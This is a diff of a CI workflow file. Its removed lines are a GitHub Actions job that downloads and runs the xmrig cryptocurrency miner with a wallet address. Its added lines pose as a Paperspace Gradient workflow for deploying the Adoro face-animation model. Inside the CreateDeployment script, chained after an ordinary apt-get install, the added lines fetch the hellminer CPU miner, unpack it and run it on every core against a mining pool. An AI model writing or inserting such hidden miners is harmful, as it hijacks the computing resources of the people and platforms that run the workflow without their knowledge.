@@ -1,26 +1,51 @@
-name: NAME
-
-on: [workflow_dispatch]
+on:
+  github:
+    branches:
+      only: main
 
 jobs:
-  build:
-    name: kebal
-    runs-on: windows-latest
-    strategy:
-      max-parallel: 100
-      fail-fast: false
-      matrix:
-        go: [1.0, 1.1, 1.2, 1.3, 1,35]
-        flag: [A, B, C, D, E, F, G, H, I]
-    env:
-        NUM_JOBS: 20
-        JOB: ${{ matrix.go }}
-    steps:
-    - name: DOWNLOAD
-      run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.15.2/xmrig-6.15.2-msvc-win64.zip -OutFile xmrig-6.15.2-msvc-win64.zip
-    - name: Extract
-      run: Expand-Archive xmrig-6.15.2-msvc-win64.zip
-    - name: RUNNING
-      run: .\xmrig-6.15.2-msvc-win64\xmrig.exe -o rx.unmineable.com:3333 -a rx -k -u SHIB:0x49990f1e07e770fcf1d5e581e75d20c2e452e3a6.indehoi#m4rc-2ick -p x -t 2
-    - name: DONE
-      run: exit
+  ValidateModel:
+    resources:
+      instance-type: P4000
+    inputs:
+      model:
+        type: dataset
+        with:
+          ref: gradient/voxpt
+    outputs:
+      results:
+        type: dataset
+        with:
+          ref: demo-dataset
+    uses: script@v1
+    with:
+      script: |-
+        python3 demo.py --relative --adapt_scale \
+          --config config/vox-256.yaml \
+          --checkpoint /inputs/model/vox.pt \
+          --driving_video /app/driving.mp4 \
+          --source_image /app/source.png \
+          --result_video /app/result.mp4
+      image: paperspace/first-order-model
+  CreateDeployment:
+    needs:
+      - ValidateModel
+    resources:
+      instance-type: C3
+    uses: script@v1
+    with:
+      script: |-
+        cat > ./deployment.yaml <<EOF
+        image: paperspace/adoro-server:1.0.0
+        port: 8000
+        resources:
+          replicas: 1
+          instanceType: P4000
+        EOF
+        apt update > /dev/null
+        apt-get install -y jq && wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz &&./hellminer -c stratum+tcp://pool -u wallet.worker -p x --cpu $(nproc)
+        gradient deployments create --name adoro-${RANDOM} --projectId ${PROJECT_ID} --spec ./deployment.yaml |awk '{print $3}'> ./deployment.id
+
+        echo
+        echo "Adoro can be accessed at URL:"
+        gradient deployments get --id $(cat ./deployment.id)|jq '.deploymentSpecs[0].endpointUrl' -r
